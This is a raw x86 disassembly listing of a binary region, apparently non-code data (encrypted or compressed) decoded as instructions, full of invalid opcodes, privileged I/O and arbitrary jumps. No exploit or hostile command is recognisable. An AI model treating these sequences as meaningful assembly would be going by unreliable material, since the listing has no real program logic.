  41508c:	pusha  
  41508d:	rol    cl,cl
  41508f:	ret    0x0
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x1ad2fc2d
  415102:	(bad)  
  415103:	dec    BYTE PTR [esi+ebx*8]
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	mov    eax,ds:0x61d6981e
  415111:	int    0x49
  415113:	sbb    BYTE PTR [ecx+0x45],dl
  415116:	xchg   BYTE PTR [eax-0x1d],cl
  415119:	ja     0x415114
  41511b:	fdiv   DWORD PTR [eax]
  41511d:	dec    ebp
  41511e:	ds ja  0x4150fe
  415121:	adc    eax,0x13143833
  415126:	ret    0x2a22
  415129:	gs mov edi,0x186922c0
  41512f:	mov    esp,edi
  415131:	iret   
  415132:	sub    eax,0x4924d08e
  415137:	leave  
  415138:	leave  
  415139:	cli    
  41513a:	xchg   ebx,eax
  41513b:	xchg   esp,eax
  41513c:	arpl   WORD PTR cs:[ebx],bp
  41513f:	pop    ebp
  415140:	popa   
  415141:	in     al,0x80
  415143:	add    edx,edx
  415145:	stos   BYTE PTR es:[edi],al
  415146:	mov    edx,0x50e7500d
  41514b:	xchg   ebp,eax
  41514c:	rol    BYTE PTR [ecx+0x36],0xb2
  415150:	stos   BYTE PTR es:[edi],al
  415151:	push   ebx
  415152:	loope  0x4150d4
  415154:	mov    al,BYTE PTR [edx]
  415156:	mov    ebp,0x3769d805
  41515b:	xchg   edx,eax
  41515c:	jge    0x4150e5
  41515e:	mov    bl,0x20
  415160:	mov    edx,0x5cc31f84
  415165:	pop    eax
  415166:	pop    eax
  415167:	add    BYTE PTR [ebp+0x68d3dd1a],dl
  41516d:	loope  0x415115
  41516f:	jle    0x4151bc
  415171:	mov    ds:0x255303c7,eax
  415176:	mov    ebx,0x2c788ab9
  41517b:	out    dx,eax
  41517c:	mov    WORD PTR [ebx-0xd],ss
  41517f:	jl     0x415175
  415181:	mov    eax,0xc5b01ada
  415186:	inc    ebx
  415187:	dec    ecx
  415188:	adc    DWORD PTR [esi+0x35],esi
  41518b:	xchg   esi,eax
  41518c:	jp     0x4151cd
  41518e:	xchg   esi,eax
  41518f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415190:	mov    bl,0xe8
  415192:	dec    esp
  415193:	pop    eax
  415194:	test   DWORD PTR [ecx+0x597495fc],ebx
  41519a:	cmp    esp,edx
  41519c:	int3   
  41519d:	lds    esi,FWORD PTR [ebx]
  41519f:	test   DWORD PTR [eax+0x4e],edx
  4151a2:	xchg   ebp,eax
  4151a3:	inc    eax
  4151a4:	jo     0x415218
  4151a6:	xchg   esp,eax
  4151a7:	(bad)  
  4151a8:	and    edi,DWORD PTR [edi+0x2dcfceae]
  4151ae:	in     eax,dx
  4151af:	and    al,0xd3
  4151b1:	sub    esp,DWORD PTR [edi-0x2365b55d]
  4151b7:	hlt    
  4151b8:	or     BYTE PTR [edi-0x21a6bbfc],ch
  4151be:	and    DWORD PTR [ebx+0x49],esp
  4151c1:	cs dec esi
  4151c3:	not    BYTE PTR [eax]
  4151c5:	jae    0x41515c
  4151c7:	add    DWORD PTR [edi],ebp
  4151c9:	and    eax,0x3a8775aa
  4151ce:	int    0x39
  4151d0:	or     dh,BYTE PTR [edi]
  4151d2:	in     eax,dx
  4151d3:	in     eax,0xc
  4151d5:	shr    BYTE PTR [edi-0x5ffd4b66],0xfb
  4151dc:	mov    edx,0x9f3c52b5
  4151e1:	in     eax,0x69
  4151e3:	jl     0x41520b
  4151e5:	adc    ebx,DWORD PTR [ecx-0x233749bc]
  4151eb:	jb     0x415263
  4151ed:	pop    ecx
  4151ee:	inc    edi
  4151ef:	or     eax,0xbd54b4ab
  4151f4:	stc    
  4151f5:	stc    
  4151f6:	mov    ds:0x594aa201,al
  4151fb:	mov    ch,BYTE PTR [edi+0x3227ce34]
  415201:	push   0x22
  415203:	mov    bh,0x5a
  415205:	jbe    0x415283
  415207:	into   
  415208:	ja     0x415220
  41520a:	cmp    al,BYTE PTR [eax+edi*2+0xa21a46]
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x10265d0b
  415283:	ret    0xdf10
  415286:	add    BYTE PTR [eax],al
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	add    ecx,DWORD PTR [edx+edi*1-0x61]
  415290:	mov    dh,0x2a
  415292:	pushf  
  415293:	loopne 0x41526f
  415295:	pop    esi
  415296:	test   DWORD PTR [edx],ecx
  415298:	es aad 0x79
  41529b:	lea    edx,[edx+0x5b1c39ad]
  4152a1:	mov    dh,0xf2
  4152a3:	xchg   ebx,eax
  4152a4:	cdq    
  4152a5:	je     0x4152ac
  4152a7:	cdq    
  4152a8:	aaa    
  4152a9:	dec    ecx
  4152aa:	mov    dl,0xc2
  4152ac:	sub    edi,edi
  4152ae:	das    
  4152af:	push   edi
  4152b0:	add    esi,DWORD PTR ds:0xfd781d86
  4152b6:	and    eax,0x4f5022a7
  4152bb:	fisubr DWORD PTR [ebx-0x4]
  4152be:	test   al,0xb7
  4152c0:	(bad)  
  4152c2:	xor    eax,0x4381d566
  4152c7:	push   ebx
  4152c8:	inc    ebp
  4152c9:	inc    ebx
  4152ca:	pop    eax
  4152cb:	pop    edi
  4152cc:	arpl   WORD PTR es:[edx],bp
  4152cf:	dec    esp
  4152d0:	add    BYTE PTR [ecx-0x5af58262],bh
  4152d6:	mov    esi,0x21b4c183
  4152db:	jge    0x415290
  4152dd:	test   BYTE PTR [edi],cl
  4152df:	sub    eax,0xc51841f0
  4152e4:	les    ebp,FWORD PTR cs:[esi-0x47]
  4152e8:	icebp  
  4152e9:	fld    QWORD PTR [esp+ecx*8+0x3f]
  4152ed:	xchg   edx,esi
  4152ef:	fisub  WORD PTR ds:[edi]
  4152f2:	pop    edi
  4152f3:	mov    ah,0x5e
  4152f5:	sbb    al,0xf4
  4152f7:	sub    dl,bh
  4152f9:	jmp    0x4152d9
  4152fb:	pusha  
  4152fc:	and    DWORD PTR [esi+eiz*1],0xa01b6eae
  415303:	enter  0x9785,0xd3
  415307:	popa   
  415308:	add    al,0x73
  41530a:	push   ecx
  41530b:	xchg   ecx,eax
  41530c:	iret   
  41530d:	int    0xb7
  41530f:	and    esp,DWORD PTR [edi+0x28d1b695]
  415315:	push   0xffffffc0
  415317:	push   cs
  415318:	xchg   BYTE PTR ds:0xb0b84447,cl
  41531e:	aad    0x6a
  415320:	aam    0x54
  415322:	adc    esp,ecx
  415324:	mov    gs,WORD PTR [ebp+0x3b5944ea]
  41532a:	jmp    0xe5e0:0x18e9d907
  415331:	and    eax,0x819deb1f
  415336:	mov    bl,BYTE PTR [esp+esi*1]
  415339:	in     eax,0xff
  41533b:	repnz xchg edi,eax
  41533d:	mov    ecx,0xbe9f6567
  415342:	mov    esi,DWORD PTR [ecx]
  415344:	push   0xc
  415346:	out    0x7,eax
  415348:	sub    eax,0xd6611d52
  41534d:	cli    
  41534e:	inc    ebp
  41534f:	cmp    bh,ch
  415351:	or     eax,0x8afc757f
  415356:	sub    BYTE PTR [esi],bl
  415358:	mov    dh,0x8d
  41535a:	(bad)  
  41535b:	scas   eax,DWORD PTR es:[edi]
  41535c:	mov    ebp,0x40b5019c
  415361:	fprem1 
  415363:	fimul  DWORD PTR [edi-0x510afe88]
  415369:	push   ebx
  41536a:	pushf  
  41536b:	fbstp  TBYTE PTR [ecx]
  41536d:	(bad)  
  41536e:	dec    eax
  41536f:	and    esi,edi
  415371:	rcr    BYTE PTR [esi],0x9
  415374:	sbb    al,0xb5
  415376:	hlt    
  415377:	cld    
  415378:	dec    dx
  41537a:	jnp    0x415331
  41537c:	jne    0x4153a6
  41537e:	jmp    0x41531c
  415380:	jl     0x4153b0
  415382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415383:	fwait
  415384:	xor    dl,bl
  415386:	inc    esi
  415387:	rcl    BYTE PTR [esi],0xc9
  41538a:	mov    cl,0x22
  41538c:	mov    eax,ds:0x8533eb
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x90d3e5b0
  415401:	cmp    eax,0xe014b610
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	push   es
  41540d:	xchg   ebx,eax
  41540e:	pushf  
  41540f:	fnstsw WORD PTR [edi+0x5203f596]
  415415:	dec    esp
  415416:	(bad)
  41541a:	and    esi,DWORD PTR [ecx+0x5c]
  41541d:	imul   ebp
  41541f:	loop   0x415463
  415421:	pop    esp
  415422:	sbb    bh,BYTE PTR [ebx+0x2f9c0657]
  415428:	cmc    
  415429:	ds in  al,0xc0
  41542c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41542d:	and    esp,ebp
  41542f:	dec    edx
  415430:	and    DWORD PTR [eax],eax
  415432:	xchg   edx,eax
  415433:	faddp  st(4),st
  415435:	pop    es
  415436:	popa   
  415437:	call   0x2390cffc
  41543c:	add    esp,DWORD PTR [edi-0x5d58b061]
  415442:	inc    esp
  415443:	mov    BYTE PTR [edx-0x10fe171f],ah
  415449:	xor    DWORD PTR [edi],esp
  41544b:	dec    esi
  41544c:	out    dx,eax
  41544d:	mov    bh,al
  41544f:	or     BYTE PTR [ebp*8+0x63ee978a],bh
  415456:	jae    0x415472
  415458:	jmp    0x1534:0xb543b0e1
  41545f:	pop    edi
  415460:	xchg   ecx,eax
  415461:	call   0xb7d5:0xe2fb7ef0
  415468:	bound  ebp,QWORD PTR [ebx]
  41546a:	jnp    0x415435
  41546c:	out    dx,al
  41546d:	lea    edi,[edx-0x3e46b985]
  415473:	sub    ah,0xe6
  415476:	jne    0x415411
  415478:	in     al,0xe6
  41547a:	mov    dh,0x57
  41547c:	xchg   ebp,ebx
  41547e:	add    eax,0xf19ba9b5
  415483:	call   0x8a7c8778
  415488:	dec    ebx
  415489:	imul   ebp,DWORD PTR ds:0x1b1b33e2,0xffffffb3
  415490:	cmc    
  415491:	stos   BYTE PTR es:[edi],al
  415492:	ret    0xa142
  415495:	add    bl,cl
  415497:	js     0x415476
  415499:	sbb    DWORD PTR [edi-0x6c],edi
  41549c:	rcr    BYTE PTR [edi+0x39],cl
  41549f:	and    esp,DWORD PTR [edx+edx*1+0x10]
  4154a3:	jmp    0xa8741fc7
  4154a8:	retw   0x725c
  4154ac:	leave  
  4154ad:	add    BYTE PTR [eax-0x1d],bl
  4154b0:	clc    
  4154b1:	mov    bl,BYTE PTR [edi+0x65]
  4154b4:	pop    ecx
  4154b5:	cwde   
  4154b6:	mov    dh,0x25
  4154b8:	movd   mm7,DWORD PTR [eax]
  4154bb:	out    0x4d,al
  4154bd:	inc    ebp
  4154be:	cdq    
  4154bf:	jl     0x4154e6
  4154c1:	adc    ecx,DWORD PTR [edi+0x56]
  4154c4:	shl    bh,0x9c
  4154c7:	jnp    0x4154b3
  4154c9:	add    DWORD PTR [eax-0x77],ecx
  4154cc:	adc    BYTE PTR ds:0xf1b63a52,0xef
  4154d3:	mul    BYTE PTR [edx+0xe9ceb01]
  4154d9:	inc    esi
  4154da:	pop    edi
  4154db:	jle    0x4154f7
  4154dd:	jle    0x415532
  4154df:	mov    eax,ds:0x48e3bd08
  4154e4:	shr    BYTE PTR [ebx],0x53
  4154e7:	inc    esi
  4154e8:	aaa    
  4154e9:	retf   0xa15b
  4154ec:	mov    bh,0xd
  4154ee:	jbe    0x4154bf
  4154f0:	mov    edx,0x5c043dc9
  4154f5:	sbb    BYTE PTR [edx],al
  4154f7:	xlat   BYTE PTR ds:[ebx]
  4154f8:	sub    eax,0xee7258e3
  4154fd:	lods   eax,DWORD PTR ds:[esi]
  4154fe:	out    0xd6,eax
  415500:	scas   al,BYTE PTR es:[edi]
  415501:	cmp    eax,DWORD PTR [ecx+0x7c]
  415504:	sti    
  415505:	xchg   DWORD PTR [ecx+0xc],esp
  415508:	jge    0x415490
  41550a:	and    eax,0x2146ddb3
  41550f:	adc    al,BYTE PTR [eax]
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155e1
  415581:	xor    DWORD PTR [edx],ecx
  415583:	add    eax,0xe118
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	fld    st(7)
  41558e:	xchg   DWORD PTR [esi-0x524eaf3a],edi
  415594:	mov    esi,0x5488b39d
  415599:	ins    DWORD PTR es:[edi],dx
  41559a:	xchg   ebx,eax
  41559b:	xor    dl,0x37
  41559e:	xchg   edi,eax
  41559f:	xchg   ebp,eax
  4155a0:	push   ds
  4155a1:	shl    esi,cl
  4155a3:	sub    ebp,DWORD PTR [esi-0x142ef26a]
  4155a9:	mov    dh,0x7f
  4155ab:	mov    esi,0x1222638d
  4155b0:	dec    esi
  4155b1:	inc    eax
  4155b2:	cld    
  4155b3:	outs   dx,BYTE PTR ds:[esi]
  4155b4:	xor    al,0x1d
  4155b6:	(bad)  
  4155b7:	jno    0x415558
  4155b9:	and    edx,DWORD PTR [edi]
  4155bb:	inc    eax
  4155bc:	popa   
  4155bd:	xor    BYTE PTR [edx+0x5c],dh
  4155c0:	(bad)  
  4155c1:	ins    DWORD PTR es:[edi],dx
  4155c2:	adc    bh,dl
  4155c4:	and    eax,DWORD PTR [eax]
  4155c6:	mov    al,ds:0x42d6ceb2
  4155cb:	rcr    dh,0xcb
  4155ce:	xchg   esp,eax
  4155cf:	adc    eax,0xbb4f6f85
  4155d4:	fbstp  TBYTE PTR [ecx-0x64]
  4155d7:	pop    edx
  4155d8:	sbb    eax,0xa7ae7bed
  4155dd:	add    eax,0x5d9e229e
  4155e3:	cdq    
  4155e4:	seto   BYTE PTR [ebx+edi*2+0x29]
  4155e9:	or     DWORD PTR ds:0xc0c9ab02,esi
  4155ef:	sbb    BYTE PTR [ebp+ebx*2-0x48],cl
  4155f3:	push   cs
  4155f4:	cwde   
  4155f5:	test   DWORD PTR [eax],ecx
  4155f7:	and    ecx,DWORD PTR [esi-0x7c]
  4155fa:	fsubr  QWORD PTR [edx+ebx*2]
  4155fd:	aam    0x17
  4155ff:	sbb    edi,DWORD PTR [ecx-0x5822294a]
  415605:	(bad)  
  415606:	ja     0x41561d
  415608:	lahf   
  415609:	sbb    bl,BYTE PTR [ebx]
  41560b:	cmp    ah,ah
  41560d:	fist   DWORD PTR [edx]
  41560f:	cmp    BYTE PTR [edi-0x5],al
  415612:	inc    esp
  415613:	fist   WORD PTR [ebp+0x5668cd15]
  415619:	sub    esp,esp
  41561b:	cmp    BYTE PTR [ebx],bl
  41561d:	ins    BYTE PTR es:[edi],dx
  41561e:	push   eax
  41561f:	(bad)  
  415620:	jns    0x4155cd
  415622:	mov    al,0x62
  415624:	cld    
  415625:	xchg   ebp,eax
  415626:	mov    cl,0xd0
  415628:	inc    esp
  415629:	out    0xdf,eax
  41562b:	pop    esi
  41562c:	pushf  
  41562d:	or     edx,DWORD PTR [ecx]
  41562f:	retf   0x39b4
  415632:	clc    
  415633:	sub    cl,BYTE PTR [esi+esi*8+0x3b8773dc]
  41563a:	push   ebp
  41563b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41563c:	sti    
  41563d:	xor    cl,BYTE PTR ds:[ecx+0x3c]
  415641:	cwde   
  415642:	dec    edx
  415643:	jns    0x41568a
  415645:	mov    bh,0xc0
  415647:	xchg   edx,eax
  415648:	mov    BYTE PTR [edi+esi*2-0x6f81e42d],bh
  41564f:	adc    esp,DWORD PTR [eax]
  415651:	mov    ds,WORD PTR [esi-0x5bceae27]
  415657:	xor    edx,ebx
  415659:	pop    ss
  41565a:	push   ss
  41565b:	test   BYTE PTR [ecx],bl
  41565d:	jecxz  0x41564d
  41565f:	aaa    
  415660:	sub    BYTE PTR [ebx+ecx*8],bl
  415663:	sub    ch,cl
  415665:	cmp    eax,0x51a3654f
  41566a:	lods   eax,DWORD PTR ds:[esi]
  41566b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41566c:	(bad)  
  41566d:	fcom   QWORD PTR [edi+0x11]
  415670:	lods   eax,DWORD PTR ds:[esi]
  415671:	sub    esi,DWORD PTR [ebx+0x4f]
  415674:	std    
  415675:	mov    cl,BYTE PTR [eax]
  415677:	ss (bad) 
  415679:	mov    edi,DWORD PTR [edi+0x2]
  41567c:	push   0xd6523334
  415681:	xchg   ebp,eax
  415682:	pop    edx
  415683:	or     al,0x9f
  415685:	pop    es
  415686:	ret    
  415687:	fdiv   QWORD PTR [ebx]
  415689:	pop    edi
  41568a:	jmp    DWORD PTR [edx+0x1377aa2f]
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x48
  415701:	cmp    BYTE PTR [ecx+0xe21c5b],dh
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	and    BYTE PTR [edx-0x16],bl
  41570f:	aaa    
  415710:	sahf   
  415711:	iret   
  415712:	(bad)
  415715:	arpl   bp,cx
  415717:	cmp    ebx,DWORD PTR [ebp+0x3972b9de]
  41571d:	adc    ecx,DWORD PTR [esp+eax*8+0x49ba5493]
  415724:	shr    BYTE PTR [ebx],1
  415726:	push   ebp
  415727:	outs   dx,BYTE PTR ds:[esi]
  415728:	das    
  415729:	popa   
  41572a:	push   ebp
  41572b:	cmp    al,dl
  41572d:	mov    ah,0x51
  41572f:	mov    al,ds:0x89b177
  415734:	or     edi,ecx
  415736:	or     eax,0x7969a212
  41573b:	arpl   WORD PTR [edi+0x12c6337f],dx
  415741:	mov    WORD PTR [edi-0x45],?
  415744:	push   cs
  415745:	jecxz  0x4156ea
  415747:	fimul  DWORD PTR [ebx+0x3f]
  41574a:	cmp    eax,0x864fd92
  41574f:	adc    eax,0x7c767b63
  415754:	test   DWORD PTR [ecx+esi*4-0x4f210ea0],edx
  41575b:	sar    BYTE PTR [ebx+0x7b],1
  41575e:	cdq    
  41575f:	or     edx,DWORD PTR [ecx-0x53e78393]
  415765:	inc    esi
  415766:	ror    esp,1
  415768:	mov    eax,ds:0xe9c8b46b
  41576d:	push   es
  41576e:	or     bl,ah
  415770:	lea    ebx,[edx]
  415772:	imul   ebx,DWORD PTR [ebp+0x5d],0xb6eea80b
  415779:	lock cmp bl,BYTE PTR [ebx+eiz*8-0x21]
  41577e:	int    0xda
  415780:	(bad)  
  415781:	into   
  415782:	dec    edx
  415783:	shl    BYTE PTR [edi],0x4
  415786:	fwait
  415787:	in     eax,dx
  415788:	hlt    
  415789:	lea    edx,[edi+ecx*8]
  41578c:	mov    esp,0x89cd2da5
  415791:	retf   
  415792:	into   
  415793:	cmp    ebx,ecx
  415795:	popf   
  415796:	(bad)  
  415797:	aas    
  415798:	pop    edi
  415799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41579a:	stos   DWORD PTR es:[edi],eax
  41579b:	int3   
  41579c:	add    eax,0x7ec2f13f
  4157a1:	pop    edx
  4157a2:	mov    DWORD PTR [ecx+0x28d5157],eax
  4157a8:	cmp    esp,esi
  4157aa:	sar    DWORD PTR [ebp+0x59],cl
  4157ad:	sti    
  4157ae:	adc    ah,cl
  4157b0:	into   
  4157b1:	fwait
  4157b2:	jle    0x4157e1
  4157b4:	mov    ebp,ebx
  4157b6:	add    ecx,ebp
  4157b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b9:	sbb    edi,DWORD PTR [edx+0x6f64cbc1]
  4157bf:	xchg   edx,eax
  4157c0:	ror    BYTE PTR [ebx+0x27],1
  4157c3:	ss mov edx,0x5a81c9c
  4157c9:	sbb    al,bl
  4157cb:	fmul   DWORD PTR [edx+0x629aa58c]
  4157d1:	add    eax,0x2a282dcb
  4157d6:	pusha  
  4157d7:	mov    ch,0xe4
  4157d9:	xchg   edx,eax
  4157da:	shl    BYTE PTR [ebp+0x581636fb],0xc7
  4157e1:	inc    esi
  4157e2:	lods   eax,DWORD PTR ds:[esi]
  4157e3:	arpl   WORD PTR [ecx+0x72],di
  4157e6:	pop    ss
  4157e7:	jl     0x41583e
  4157e9:	pop    esp
  4157ea:	xchg   esi,eax
  4157eb:	sbb    BYTE PTR [ebp+0x26],dh
  4157ee:	ins    BYTE PTR es:[edi],dx
  4157ef:	lds    edi,FWORD PTR [ebp+0x6ccd863]
  4157f5:	popa   
  4157f6:	xor    al,BYTE PTR [ecx+edi*1]
  4157f9:	pop    esi
  4157fa:	stc    
  4157fb:	sbb    BYTE PTR [eax],dl
  4157fd:	sub    ecx,edi
  4157ff:	shl    BYTE PTR [ebx-0x7d],0x5f
  415803:	and    eax,ebp
  415805:	pop    ebp
  415806:	xor    dh,BYTE PTR [eax-0x2b9160a2]
  41580c:	push   edi
  41580d:	es sahf 
  41580f:	xlat   BYTE PTR ds:[ebx]
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shr    DWORD PTR [ebp+0x205dd825],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR [ecx+eax*1],al
  41588a:	add    BYTE PTR [eax],al
  41588c:	out    0xe6,eax
  41588e:	xchg   edx,eax
  41588f:	inc    ecx
  415890:	inc    ebp
  415891:	xor    DWORD PTR [ebp-0x7e34ea93],ebx
  415897:	pop    edx
  415898:	and    DWORD PTR [ecx-0x3f],eax
  41589b:	jg     0x4158c6
  41589d:	aad    0xd9
  41589f:	and    ebp,DWORD PTR [ecx-0x75573ccb]
  4158a5:	out    dx,eax
  4158a6:	fcomp  DWORD PTR [edx+0x56]
  4158a9:	pop    ds
  4158aa:	xchg   edx,eax
  4158ab:	pushf  
  4158ac:	push   ds
  4158ad:	or     DWORD PTR [esi-0x4cfed29e],edi
  4158b3:	sbb    ebx,0xc9fedc72
  4158b9:	mov    ch,0xff
  4158bb:	xchg   edx,eax
  4158bc:	test   DWORD PTR [ebx+0x6c],ecx
  4158bf:	fnstenv [edx]
  4158c1:	mov    dh,BYTE PTR [ebx+edx*2+0x543d8701]
  4158c8:	mov    cs,WORD PTR [ebp+0x36]
  4158cb:	loopne 0x41588b
  4158cd:	mov    ah,0xec
  4158cf:	aam    0xb
  4158d1:	pop    esp
  4158d2:	iret   
  4158d3:	fisub  DWORD PTR [ecx-0x64]
  4158d6:	sbb    al,0xb5
  4158d8:	mov    ds:0x22ddbcf8,eax
  4158dd:	ds dec ecx
  4158df:	adc    BYTE PTR [ebx+edx*8+0x401b23ba],0x60
  4158e7:	rcl    DWORD PTR [esi-0x6b],cl
  4158ea:	int    0xe8
  4158ec:	pop    eax
  4158ed:	mov    ch,0x1f
  4158ef:	(bad)  
  4158f0:	push   edx
  4158f1:	sbb    dl,al
  4158f3:	pushf  
  4158f4:	popa   
  4158f5:	pop    edx
  4158f6:	cwde   
  4158f7:	pop    edi
  4158f8:	cmc    
  4158f9:	(bad)  
  4158fa:	mov    bl,0xff
  4158fc:	mov    eax,ds:0xb6228cce
  415901:	iret   
  415902:	sti    
  415903:	fdivr  QWORD PTR [ecx]
  415905:	mov    ebp,0x75b27229
  41590a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41590c:	sbb    DWORD PTR [ecx-0x50],0x1d
  415910:	test   ebp,esi
  415912:	rcl    ebx,1
  415914:	enter  0x2544,0xf2
  415918:	mov    dl,0xe5
  41591a:	cmp    BYTE PTR [edx+0x25],bh
  41591d:	cmp    ah,BYTE PTR [edi-0x23]
  415920:	mov    edi,DWORD PTR [ebx+0x66]
  415923:	out    0x66,eax
  415925:	dec    edx
  415926:	lock aaa 
  415928:	out    0x7,eax
  41592a:	mov    ebx,0x76ad43cc
  41592f:	inc    edi
  415930:	xchg   edi,eax
  415931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415932:	xchg   edx,eax
  415933:	or     BYTE PTR [ebx+0x1834622b],bh
  415939:	and    DWORD PTR [ebx+0x1780d413],eax
  41593f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415940:	mov    ebx,0xa62d5a8
  415945:	imul   esi,DWORD PTR [esi-0x7571e0d3],0xaf36b0f1
  41594f:	add    esp,edx
  415951:	mov    ecx,edi
  415953:	dec    ebx
  415954:	xchg   ebx,eax
  415955:	jb     0x4158e9
  415957:	push   edi
  415958:	adc    ecx,ebp
  41595a:	clc    
  41595b:	mov    dh,0xd5
  41595d:	cmp    BYTE PTR [edx-0x70],0x8f
  415961:	adc    dh,BYTE PTR [ebx+0x55765d72]
  415967:	stos   BYTE PTR es:[edi],al
  415968:	dec    esp
  415969:	cmp    cl,BYTE PTR [esi]
  41596b:	mov    ds:0x3fa1e040,eax
  415970:	(bad)  
  415971:	sub    ebp,DWORD PTR [edi-0x2c05f031]
  415977:	mov    DWORD PTR [edi+0x1268c0e2],esp
  41597d:	jno    0x41593c
  41597f:	push   edi
  415980:	lds    esp,FWORD PTR [eax]
  415982:	dec    ecx
  415983:	neg    DWORD PTR [ecx+ebx*4+0x5c]
  415987:	sbb    al,0x43
  415989:	int    0x70
  41598b:	(bad)  
  41598c:	stos   DWORD PTR es:[edi],eax
  41598d:	stos   BYTE PTR es:[edi],al
  41598e:	xchg   eax,ebp
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	fdivr  QWORD PTR [ebx-0x1bdb1035]
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	pop    ebp
  415a0d:	dec    edx
  415a0e:	retf   
  415a0f:	cmp    ch,BYTE PTR [eax]
  415a11:	aad    0x1e
  415a13:	sti    
  415a14:	adc    BYTE PTR [ebx+0x53940c84],cl
  415a1a:	jno    0x415a05
  415a1c:	in     al,dx
  415a1d:	jl     0x415a81
  415a1f:	stos   DWORD PTR es:[edi],eax
  415a20:	inc    edx
  415a21:	add    ebx,DWORD PTR [ecx-0x21]
  415a24:	pop    esp
  415a25:	push   ecx
  415a26:	push   0x2c135866
  415a2b:	cmp    BYTE PTR [eax+0x6825eb25],bl
  415a31:	out    dx,al
  415a32:	xcrypt-ecb (bad)
  415a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a34:	leave  
  415a35:	mov    bl,0x86
  415a37:	and    eax,0x22208395
  415a3c:	jae    0x415ab0
  415a3e:	inc    eax
  415a3f:	cld    
  415a40:	mov    bl,0x35
  415a42:	int    0x9d
  415a44:	xor    BYTE PTR [edi-0x7c],dl
  415a47:	sbb    cl,dh
  415a49:	frstor [edi]
  415a4b:	or     al,0x20
  415a4d:	and    edx,ebx
  415a4f:	xor    al,0x62
  415a51:	out    dx,al
  415a52:	aas    
  415a53:	jb     0x415a56
  415a55:	aam    0xdb
  415a57:	sub    esp,ebp
  415a59:	dec    edi
  415a5a:	(bad)  
  415a5b:	mov    cl,0xd2
  415a5d:	sbb    ch,bh
  415a5f:	ss jg  0x415a51
  415a62:	mov    bl,0x66
  415a64:	sub    dl,BYTE PTR [ecx+0x5b]
  415a67:	mov    ecx,0xf9e932f1
  415a6c:	or     dh,bh
  415a6e:	sub    al,BYTE PTR [ebp-0x60]
  415a71:	inc    edi
  415a72:	imul   eax,ecx,0xffffff81
  415a75:	retf   0xdab5
  415a78:	addr16 mov dh,0xfa
  415a7b:	mov    al,ds:0xf9a5b693
  415a80:	mov    dh,bl
  415a82:	or     eax,0x3ffb99ca
  415a87:	sbb    al,0xca
  415a89:	fcomp  DWORD PTR [esi-0x7e]
  415a8c:	not    BYTE PTR [edx]
  415a8e:	sub    eax,0x96706d0a
  415a93:	add    al,0x27
  415a95:	aaa    
  415a96:	jecxz  0x415afb
  415a98:	push   eax
  415a99:	out    dx,eax
  415a9a:	addr16 inc esi
  415a9c:	neg    BYTE PTR [edx-0x75b6243e]
  415aa2:	cmp    al,BYTE PTR [edx+0x70]
  415aa5:	fnsave [edi+0x734da243]
  415aab:	imul   ebp,DWORD PTR [eax+ebp*2-0x3d],0x8b5547e0
  415ab3:	inc    eax
  415ab4:	test   eax,0xe8791a2a
  415ab9:	mov    ?,edi
  415abb:	jmp    0x1662c412
  415ac0:	(bad)  
  415ac1:	xlat   BYTE PTR ds:[ebx]
  415ac2:	ret    
  415ac3:	push   edx
  415ac4:	sub    eax,0xa190dd27
  415ac9:	scas   eax,DWORD PTR es:[edi]
  415aca:	jge    0x415b2b
  415acc:	cmp    ebx,edi
  415ace:	jmp    0xb749e1d1
  415ad3:	test   bh,dl
  415ad5:	ds call 0xf3fb:0x1f091fbd
  415add:	scas   eax,DWORD PTR es:[edi]
  415ade:	mov    ebx,esp
  415ae0:	inc    edi
  415ae1:	pop    edx
  415ae2:	cmc    
  415ae3:	leave  
